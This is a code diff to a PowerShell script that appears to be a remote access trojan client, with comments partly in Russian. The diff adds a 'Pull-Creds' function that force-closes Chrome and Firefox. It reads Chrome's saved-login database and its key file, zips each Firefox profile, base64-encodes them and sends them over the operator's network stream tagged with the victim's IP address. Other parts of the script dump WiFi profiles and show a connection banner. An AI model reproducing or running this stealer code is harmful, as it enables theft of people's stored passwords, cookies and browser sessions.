@@ -388,38 +388,59 @@ function PortSuggest {
         return "[DOWNLOADED] $out"
     }
 
-    function Get-Credentials {
+    function Pull-Creds {
     try {
-        $output = ""
+        # Завершаем процессы браузеров
+        Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
+        Stop-Process -Name "firefox" -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 1
 
-        # 1. Windows Credential Manager (generic credentials)
-        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
-            $target = $_.ToString().Split(":")[1].Trim()
-            $output += "`n[TARGET] $target"
+        $ip = (Test-Connection -ComputerName (hostname) -Count 1).Address.IPAddressToString
+
+        # Chrome
+        $chromeData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        $chromeState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+
+        if (Test-Path $chromeData) {
+            $b64Login = [Convert]::ToBase64String([IO.File]::ReadAllBytes($chromeData))
+            $out = "[UPLOAD]::chrome_LoginData_$ip.db::" + $b64Login + "::END"
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
+            $global:clientStream.Write($bytes, 0, $bytes.Length)
+            $global:clientStream.Flush()
         }
 
-        # 2. Chrome saved logins (мета-данные — без дешифровки)
-        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromeLoginPath) {
-            $output += "`n[+] Chrome login database found: $chromeLoginPath"
+        if (Test-Path $chromeState) {
+            $b64State = [Convert]::ToBase64String([IO.File]::ReadAllBytes($chromeState))
+            $out = "[UPLOAD]::chrome_LocalState_$ip.json::" + $b64State + "::END"
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
+            $global:clientStream.Write($bytes, 0, $bytes.Length)
+            $global:clientStream.Flush()
         }
 
-        # 3. Firefox профили (только список профилей)
-        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
-        foreach ($profile in $firefoxProfiles) {
-            $output += "`n[+] Firefox profile: $($profile.FullName)"
+        # Firefox
+        $firefoxRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
+        if (Test-Path $firefoxRoot) {
+            $profiles = Get-ChildItem $firefoxRoot -Directory -ErrorAction SilentlyContinue
+            foreach ($profile in $profiles) {
+                $zipPath = "$env:TEMP\firefox_profile.zip"
+                if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+                Compress-Archive -Path $profile.FullName -DestinationPath $zipPath -Force
+                $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zipPath))
+                $out = "[UPLOAD]::firefox_profile_$($profile.Name)_$ip.zip::" + $b64 + "::END"
+                $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
+                $global:clientStream.Write($bytes, 0, $bytes.Length)
+                $global:clientStream.Flush()
+                Remove-Item $zipPath -Force
+            }
         }
 
-        if ([string]::IsNullOrWhiteSpace($output)) {
-            return "[INFO] No credentials found or access denied."
-        }
-
-        return $output
+        return "[+] pull-creds completed for $ip"
     }
     catch {
-        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
+        return "[ERROR] pull-creds failed: $($_.Exception.Message)"
     }
 }
+
     
     function Dump-WiFi {
     netsh wlan show profiles | ForEach-Object {
@@ -635,7 +656,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST 4                                                                                                                                                                    
+                                            dwdwdfwdwd                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
